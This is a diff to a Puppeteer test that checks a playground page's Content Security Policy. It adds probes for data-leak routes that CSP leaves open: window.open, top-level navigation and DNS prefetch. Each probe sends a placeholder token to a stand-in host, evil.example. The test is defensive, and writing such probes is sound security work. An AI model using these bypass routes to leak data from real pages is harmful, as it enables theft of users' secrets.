@@ -13,6 +13,13 @@
 //     inherit the page's policy, which must allow https for them. The test says
 //     so by asserting it (a control: if this stops being true the comment in
 //     layouts/_default/playground.html and the README are out of date).
+//  3. Three more routes no directive governs (go-slides#91), asserted open the
+//     same way: window.open (a window handle comes back, no violation), top-level
+//     navigation (the main frame asks for the attacker's URL, no violation) and
+//     DNS prefetch (a rel=dns-prefetch link raises no violation). The probe
+//     cannot see a DNS lookup, so for the prefetch it proves only that CSP does
+//     not refuse the hint, not that a lookup leaves, nor that the page's
+//     x-dns-prefetch-control meta stops one.
 //
 //   node csp.cjs http://127.0.0.1:PORT/playground/
 //
@@ -55,7 +62,7 @@ async function until(page, what, fn, arg, ms = 30000) {
     const u = r.url();
     if (u.startsWith("https://images.example/")) { requested.push(u); return r.respond({ status: 200, contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64") }); }
     if (u.startsWith("https://styles.example/")) { requested.push(u); return r.respond({ status: 200, contentType: "text/css", body: "h1{color:rgb(1,2,3)}" }); }
-    if (u.startsWith("https://evil.example/f.png")) requested.push(u);
+    if (u.startsWith("https://evil.example/f.png") || u.startsWith("https://evil.example/n?")) requested.push(u);
     // the page's own origin (a local server, or the deployed site when the test is
     // pointed at it) is served for real; every other host is answered here
     if (u.startsWith(new URL(url).origin + "/")) return r.continue();
@@ -104,19 +111,52 @@ async function until(page, what, fn, arg, ms = 30000) {
     // page's policy, so it is as open as the page is; a frame loaded from a URL
     // has a policy of its own, which the page feeds (see the page's comment)
     await attempt("srcdocframe", () => { const i = document.createElement("iframe"); i.sandbox = "allow-scripts"; i.srcdoc = '<img src="https://evil.example/f.png?x=TOKEN">'; document.body.appendChild(i); });
+    // the routes no directive governs (go-slides#91; navigate-to shipped in no
+    // browser, and Chromium does not apply CSP to DNS prefetch). Only the
+    // absence of a violation is observable here for the prefetch (see below).
+    await attempt("dnsprefetch", () => { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//TOKEN.evil.example"; document.head.appendChild(l); });
     return out;
   });
+  // window.open needs a user gesture (a popup without one is blocked and returns
+  // null), so it is evaluated through the protocol with userGesture: a handle
+  // comes back, no violation fires, and the request for the URL is made
+  const popups = [];
+  browser.on("targetcreated", (t) => popups.push(t.url()));
+  browser.on("targetchanged", (t) => popups.push(t.url()));
+  const cdp = await page.createCDPSession();
+  const opened = await cdp.send("Runtime.evaluate", {
+    userGesture: true, returnByValue: true, awaitPromise: true,
+    expression: `(async () => { const seen = []; document.addEventListener("securitypolicyviolation", (e) => seen.push(e.effectiveDirective)); const w = window.open("https://evil.example/o?x=TOKEN"); await new Promise((r) => setTimeout(r, 500)); const h = w !== null; try { w && w.close(); } catch (e) {} return { handle: h, violations: seen }; })()`,
+  });
+  const wo = opened.result.value;
+  probes.windowopen = wo.violations;
+  await new Promise((r) => setTimeout(r, 300));
   const need = ["fetch", "xhr", "form", "frame", "object", "worker", "script", "import", "base", "beacon"];
   for (const k of need) if (!probes[k] || probes[k].length === 0) fail("not refused: " + k + " " + JSON.stringify(probes));
   // the controls: an image, a style sheet or a media file from any https host is NOT
   // refused (a deck links such things, and the srcdoc preview frames inherit the
   // page's policy); if one is now refused, the note in the page and the README are
   // out of date
-  const open = ["image", "stylesheet", "media"];
+  const open = ["image", "stylesheet", "media", "windowopen", "dnsprefetch"];
+  if (!wo.handle) console.error("note: window.open returned no handle (a popup blocker, or the route is now closed): update the comment in the page and the README");
+  if (!popups.some((u) => u.startsWith("https://evil.example/o?"))) console.error("note: window.open made no window for its URL: update the comment in the page and the README");
   // a violation inside the frame is not seen by the page's listener: the request
   // itself is the witness
   if (!requested.some((u) => u.startsWith("https://evil.example/f.png"))) console.error("note: a srcdoc frame's image request is now refused: update the comment in the page and the README");
   for (const k of open) if (probes[k].length !== 0) console.error("note: a " + k + " request is now refused (" + JSON.stringify(probes[k]) + "): update the comment in the page and the README");
+  // top-level navigation, last because it leaves the page: the main frame asks
+  // for the attacker's URL (the interception sees it) and no violation is
+  // reported for it. A policy that closed it would show here.
+  const navVictim = "https://evil.example/n?x=TOKEN";
+  const navViolations = [];
+  page.on("console", (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) navViolations.push(m.text()); });
+  await page.evaluate((u) => { setTimeout(() => { location.href = u; }, 0); }, navVictim).catch(() => {});
+  const navEnd = Date.now() + 5000;
+  while (!requested.includes(navVictim) && Date.now() < navEnd) await new Promise((r) => setTimeout(r, 25));
+  const navOpen = requested.includes(navVictim) && navViolations.length === 0;
+  if (!navOpen) console.error("note: top-level navigation is now refused (" + JSON.stringify(navViolations) + "): update the comment in the page and the README");
+  const stillOpen = open.filter((k) => probes[k].length === 0);
+  if (navOpen) stillOpen.push("navigation");
   await browser.close();
-  console.log("CSP_OK " + JSON.stringify({ refused: need, stillOpen: open.filter((k) => probes[k].length === 0), preview: requested.length }));
+  console.log("CSP_OK " + JSON.stringify({ refused: need, stillOpen, windowOpenHandle: wo.handle, preview: requested.length }));
 })().catch((e) => fail(e.stack || String(e)));
